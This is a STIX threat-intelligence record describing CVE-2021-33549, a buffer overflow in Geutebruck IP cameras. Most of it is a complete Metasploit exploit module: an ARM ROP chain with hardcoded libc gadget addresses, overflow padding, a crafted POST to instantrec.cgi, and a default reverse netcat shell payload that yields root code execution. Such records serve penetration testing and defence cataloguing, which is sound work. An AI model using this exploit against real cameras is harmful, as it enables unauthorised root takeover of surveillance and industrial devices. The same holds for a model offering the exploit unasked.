{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--be45cfd1-0d08-4d5f-a942-a7351067fc80",
    "created": "2024-08-14T17:01:17.158731Z",
    "modified": "2024-08-14T17:01:17.158735Z",
    "name": "Geutebruck instantrec Remote Command Execution",
    "description": " This module exploits a buffer overflow within the 'action' parameter of the /uapi-cgi/instantrec.cgi page of Geutebruck G-Cam EEC-2xxx and G-Code EBC-21xx, EFD-22xx ETHC-22xx, and EWPC-22xx devices running firmware versions == 1.12.0.27 as well as firmware versions 1.12.13.2 and 1.12.14.5. Successful exploitation results in remote code execution as the root user.  ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/geutebruck_instantrec_bof.rb",
            "external_id": "geutebruck_instantrec_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-33549"
        },
        {
            "source_name": "reference",
            "url": "https://www.randorisec.fr/udp-technology-ip-camera-vulnerabilities/"
        },
        {
            "source_name": "reference",
            "url": "http://geutebruck.com"
        },
        {
            "source_name": "reference",
            "url": "https://us-cert.cisa.gov/ics/advisories/icsa-21-208-03"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Geutebruck instantrec Remote Command Execution',\n        'Description' => %q{\n          This module exploits a buffer overflow within the 'action'\n          parameter of the /uapi-cgi/instantrec.cgi page of Geutebruck G-Cam EEC-2xxx and G-Code EBC-21xx, EFD-22xx,\n          ETHC-22xx, and EWPC-22xx devices running firmware versions == 1.12.0.27 as well as firmware\n          versions 1.12.13.2 and 1.12.14.5.\n          Successful exploitation results in remote code execution as the root user.\n        },\n\n        'Author' => [\n          'Titouan Lazard - RandoriSec', # Discovery\n          'Ibrahim Ayadhi - RandoriSec' # Metasploit Module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['CVE', '2021-33549'],\n          ['URL', 'https://www.randorisec.fr/udp-technology-ip-camera-vulnerabilities/'],\n          ['URL', 'http://geutebruck.com'],\n          ['URL', 'https://us-cert.cisa.gov/ics/advisories/icsa-21-208-03']\n        ],\n        'DisclosureDate' => '2021-07-08',\n        'Privileged' => true,\n        'Platform' => %w[unix linux],\n        'Arch' => [ARCH_ARMLE],\n        'Targets' => [\n          ['Automatic Target', {}]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'PAYLOAD' => 'cmd/unix/reverse_netcat_gaping'\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The path to the instantrec page', '/uapi-cgi/instantrec.cgi'])\n      ]\n    )\n  end\n\n  def write_payload\n    # gadgets\n    libc_add = 0x402da000\n    system_off = 0x00357fc\n    libc_data_off = 0x12c960\n    str_r1_off = 0x0006781c # str r0 into r4 + 0x14; pop r4 pc;\n    pop_r0_off = 0x00101de4 # pop r0 pc\n    pop_r1_off = 0x0010252c # pop r1 pc\n    pop_r4_off = 0x00015164 # pop r4 pc\n    system_ = libc_add + system_off\n    str_r1 = libc_add + str_r1_off\n    pop_r0 = libc_add + pop_r0_off\n    pop_r1 = libc_add + pop_r1_off\n    pop_r4 = libc_add + pop_r4_off\n    add_str = libc_data_off + libc_add + 4\n    chunks = (payload.raw + ' ' * (4 - payload.raw.length % 4)).unpack('I<*')\n    rop = []\n    rop += [pop_r4]\n    rop += [add_str - 0x14]\n    chunks.each_with_index do |chunk, index|\n      rop += [pop_r1]\n      rop += [chunk]\n      rop += [str_r1]\n      rop += if index != (chunks.length - 1)\n               [add_str - 0x14 + ((index + 1) * 4)]\n             else\n               [0x41414141]\n             end\n    end\n    rop += [pop_r0]\n    rop += [add_str]\n    rop += [system_]\n    rop.pack('V*')\n  end\n\n  def exploit\n    print_status(\"#{rhost}:#{rport} - Attempting to exploit...\")\n    pad_size = 536\n    data = Rex::Text.pattern_create(pad_size) + write_payload\n    send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri('/', Rex::Text.rand_hostname, '../', target_uri.path),\n      'vars_post' => {\n        'action' => data\n      }\n    )\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-07-08",
    "x_mitre_platforms": [
        "%w[unix linux]"
    ]
}